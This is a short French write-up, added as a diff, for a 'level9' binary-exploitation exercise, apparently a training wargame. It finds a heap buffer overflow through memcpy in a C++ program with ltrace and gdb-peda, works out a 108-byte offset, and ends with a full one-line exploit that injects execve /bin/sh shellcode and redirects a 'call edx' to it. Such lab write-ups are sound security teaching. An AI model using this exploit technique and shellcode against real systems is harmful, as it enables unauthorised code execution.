@@ -1,0 +1,31 @@
+
+on a un code en c++ qui demande un argument. une des methode de la classe N fait appel a un memcpy
+en utilisant la commande ltrace ./level9 AAAA on peut voir
+        => memcpy(0x0804a00c, "AAAA", 4)        = 0x0804a00c
+on obtient ainsi l'adresse du buffer de destinantion.
+
+la longueur necessaire pour atteindre l'overflow peut etre constatée en analysant les registres dans gdb
+lorsqu'on atteint
+
+        => 0x804867c <main+136>:	mov    eax,DWORD PTR [esp+0x10]
+EAX: 0x804a00c ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9")
+    on peut voir que 0x804a00c contient bien la copie de l'argv1
+
+        => 0x8048682 <main+142>:	mov    edx,DWORD PTR [eax]
+EAX: 0x41366441 ('Ad6A')
+    il faut une longueur superieur 108 pour etre en overflow
+
+        => 0x8048693 <main+159>:	call   edx
+    a ce niveau du code, l'adresse contenue dans edx sera appellé.
+
+    gdb-peda$ r `python -c 'print "AAAA" + "B" * 83 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x0c\xa0\x04\x08"'`
+    nous pouvons remarquer que se sont les 4 premieres valeurs copié par le memcpy qui sont transmis a edx avant le call edx.
+
+on va donc placer l'adresse du buffer en premier, suivi d'instructions n'influant en rien d'une longueur
+    len = 108 - ([addr buffer] + [shellcode])
+    len = 83
+on obtient donc au final une instruction ressamblant a ca:
+
+./level9 `python -c 'print "\x0c\xa0\x04\x08" + "A" * 83 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x0c\xa0\x04\x08"'`
+
+shell code : http://shell-storm.org/shellcode/files/shellcode-575.php
